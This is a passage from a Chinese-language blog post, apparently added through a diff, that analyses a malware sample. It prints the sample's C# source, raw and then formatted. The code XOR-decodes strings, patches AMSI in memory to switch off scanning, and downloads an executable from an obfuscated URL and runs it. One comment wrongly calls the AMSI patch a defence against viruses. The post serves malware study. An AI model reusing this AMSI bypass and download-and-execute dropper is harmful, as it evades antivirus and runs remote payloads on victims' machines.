class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">e6656d9</span>(<span class="params"><span class="keyword">string</span> zc6ea</span>)</span>;[DllImport(<span class="string">&quot;kernel32&quot;</span>,EntryPoint=<span class="string">&quot;VirtualProtect&quot;</span>)]<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">extern</span> <span class="keyword">bool</span> <span class="title">h7c586</span>(<span class="params">IntPtr mda7864,UIntPtr k27bc1b,<span class="keyword">uint</span> xcdaf29,<span class="keyword">out</span> <span class="keyword">uint</span> r84b39</span>)</span>;[DllImport(<span class="string">&quot;Kernel32.dll&quot;</span>,EntryPoint=<span class="string">&quot;RtlMoveMemory&quot;</span>,SetLastError=<span class="literal">false</span>)]<span class="function"><span class="keyword">static</span> <span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">ef5ae</span>(<span class="params">IntPtr a948e8,IntPtr l8b12e,<span class="keyword">int</span> g4c6e</span>)</span>;<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">c193b</span>(<span class="params"></span>)</span>&#123;IntPtr c2ae2d6=e6656d9(y171e(<span class="string">&quot;005844581b530f0d&quot;</span>));<span class="keyword">if</span>(c2ae2d6!=IntPtr.Zero)&#123;IntPtr r963493=v779b(c2ae2d6,y171e(<span class="string">&quot;205844586654020f774257535211&quot;</span>));<span class="keyword">if</span>(r963493!=IntPtr.Zero)&#123;UIntPtr hbaa2d=(UIntPtr)<span class="number">5</span>;<span class="keyword">uint</span> k9c379=<span class="number">0</span>;<span class="keyword">if</span>(h7c586(r963493,hbaa2d,<span class="number">0x40</span>,<span class="keyword">out</span> k9c379))&#123;Byte[] je1ed=&#123;<span class="number">0x31</span>,<span class="number">0xff</span>,<span class="number">0x90</span>&#125;;IntPtr nb327a=Marshal.AllocHGlobal(<span class="number">3</span>);Marshal.Copy(je1ed,<span class="number">0</span>,nb327a,<span class="number">3</span>);ef5ae(<span class="keyword">new</span> IntPtr(r963493.ToInt64()+<span class="number">0x001b</span>),nb327a,<span class="number">3</span>);&#125;&#125;&#125;<span class="keyword">string</span> s183fa=Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + <span class="string">&quot;\\c9255&quot;</span> + y171e(<span class="string">&quot;4f504f54&quot;</span>);<span class="keyword">new</span> WebClient().DownloadFile(y171e(<span class="string">&quot;09414341460d4c4e56565f5b5601084647435a470613414e534758080447441f56580e4e4558411a0f2c16627c437366530664587a410e4d044d52&quot;</span>),s183fa);ProcessStartInfo y6cb2=<span class="keyword">new</span> ProcessStartInfo(s183fa);Process.Start(y6cb2);<span class="keyword">return</span> <span class="number">0</span>;&#125;<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">string</span> <span class="title">y171e</span>(<span class="params"><span class="keyword">string</span> me8994</span>)</span>&#123;<span class="keyword">string</span> x8d356=<span class="string">&quot;a57157c&quot;</span>;<span class="keyword">string</span> e6656d9=<span class="string">&quot;&quot;</span>;<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;me8994.Length;i+=<span class="number">2</span>)&#123;<span class="keyword">byte</span> v779b=Convert.ToByte(me8994.Substring(i,<span class="number">2</span>),<span class="number">16</span>);e6656d9+=(<span class="keyword">char</span>)(v779b^x8d356[(i/<span class="number">2</span>)%x8d356.Length]);&#125;<span class="keyword">return</span> e6656d9;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>格式化之后</p>
+<figure class="highlight cs"><figcaption><span>using System;</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System.Runtime.InteropServices;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Net;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">yba2983</span> </span><br><span class="line">&#123;</span><br><span class="line">	[<span class="meta">DllImport(<span class="meta-string">&quot;kernel32&quot;</span>,EntryPoint=<span class="meta-string">&quot;GetProcAddress&quot;</span>)</span>]<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">v779b</span>(<span class="params">IntPtr x8d356,<span class="keyword">string</span> v7be73</span>)</span>;</span><br><span class="line">	[<span class="meta">DllImport(<span class="meta-string">&quot;kernel32&quot;</span>,EntryPoint=<span class="meta-string">&quot;LoadLibrary&quot;</span>)</span>]<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">e6656d9</span>(<span class="params"><span class="keyword">string</span> zc6ea</span>)</span>;</span><br><span class="line">	[<span class="meta">DllImport(<span class="meta-string">&quot;kernel32&quot;</span>,EntryPoint=<span class="meta-string">&quot;VirtualProtect&quot;</span>)</span>]<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">extern</span> <span class="keyword">bool</span> <span class="title">h7c586</span>(<span class="params">IntPtr mda7864,UIntPtr k27bc1b,<span class="keyword">uint</span> xcdaf29,<span class="keyword">out</span> <span class="keyword">uint</span> r84b39</span>)</span>;</span><br><span class="line">	[<span class="meta">DllImport(<span class="meta-string">&quot;Kernel32.dll&quot;</span>,EntryPoint=<span class="meta-string">&quot;RtlMoveMemory&quot;</span>,SetLastError=false)</span>]<span class="function"><span class="keyword">static</span> <span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">ef5ae</span>(<span class="params">IntPtr a948e8,IntPtr l8b12e,<span class="keyword">int</span> g4c6e</span>)</span>;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">c193b</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function"></span>	&#123;</span><br><span class="line">		IntPtr c2ae2d6=e6656d9(y171e(<span class="string">&quot;005844581b530f0d&quot;</span>));</span><br><span class="line">		<span class="keyword">if</span>(c2ae2d6!=IntPtr.Zero) </span><br><span class="line">		&#123;</span><br><span class="line">			IntPtr r963493=v779b(c2ae2d6,y171e(<span class="string">&quot;205844586654020f774257535211&quot;</span>));</span><br><span class="line">			<span class="keyword">if</span>(r963493!=IntPtr.Zero) </span><br><span class="line">			&#123;</span><br><span class="line">				UIntPtr hbaa2d=(UIntPtr)<span class="number">5</span>;</span><br><span class="line">				<span class="keyword">uint</span> k9c379=<span class="number">0</span>;</span><br><span class="line">				<span class="keyword">if</span>(h7c586(r963493,hbaa2d,<span class="number">0x40</span>,<span class="keyword">out</span> k9c379)) </span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">byte</span>[] je1ed=&#123;<span class="number">0x31</span>,<span class="number">0xff</span>,<span class="number">0x90</span>&#125;; <span class="comment">// 这里的patch是绕过AMSI检测，可以防护病毒的入侵 https://xz.aliyun.com/t/4377 https://xz.aliyun.com/t/3095</span></span><br><span class="line">					IntPtr nb327a=Marshal.AllocHGlobal(<span class="number">3</span>);</span><br><span class="line">					Marshal.Copy(je1ed,<span class="number">0</span>,nb327a,<span class="number">3</span>);</span><br><span class="line">					ef5ae(<span class="keyword">new</span> IntPtr(r963493.ToInt64()+<span class="number">0x001b</span>),nb327a,<span class="number">3</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">string</span> s183fa=Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + <span class="string">&quot;\c9255&quot;</span> + y171e(<span class="string">&quot;4f504f54&quot;</span>);</span><br><span class="line">		<span class="keyword">new</span> WebClient().DownloadFile(y171e(<span class="string">&quot;09414341460d4c4e56565f5b5601084647435a470613414e534758080447441f56580e4e4558411a0f2c16627c437366530664587a410e4d044d52&quot;</span>),s183fa);</span><br><span class="line">		ProcessStartInfo y6cb2=<span class="keyword">new</span> ProcessStartInfo(s183fa);</span><br><span class="line">		Process.Start(y6cb2);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">string</span> <span class="title">y171e</span>(<span class="params"><span class="keyword">string</span> me8994</span>) </span></span><br><span class="line"><span class="function"></span>	&#123;</span><br><span class="line">		<span class="keyword">string</span> x8d356=<span class="string">&quot;a57157c&quot;</span>;</span><br><span class="line">		<span class="keyword">string</span> e6656d9=<span class="string">&quot;&quot;</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;me8994.Length;i+=<span class="number">2</span>) </span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">byte</span> v779b=Convert.Tobyte(me8994.Substring(i,<span class="number">2</span>),<span class="number">16</span>);</span><br><span class="line">			e6656d9+=(<span class="keyword">char</span>)(v779b^x8d356[(i/<span class="number">2</span>)%x8d356.Length]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> e6656d9;</span><br><span class="line">    &#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以使用VS的重命名把对应的系统函数重命名掉。y171e就是解密函数了。</p>
+<p>实现的功能就是从对应的URL下载文件并执行。</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2021/04/21/daily/virus/3/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">每日看病毒分析和leetcode-3</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<div class="ds-share share" data-thread-key="daily/virus/3-1" data-title="每日病毒分析和leetcode-4" data-url="http://example.com/2021/04/22/daily/virus/3-1/"  data-images="https://raw.githubusercontent.com/TomQunChao/avatar/main/icon00.jpg" data-content="每日病毒分析和leetcode-4">
+    <div class="ds-share-inline">
+      <ul  class="ds-share-icons-16">
+      	<li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
+        <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
+        <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
+        <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
+        <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
+      </ul>
+      <div class="ds-share-icons-more">
+      </div>
+    </div>
+ </div>
+ 
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2021 John Doe
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>
+
+
+  </div>
+</body>
+</html>
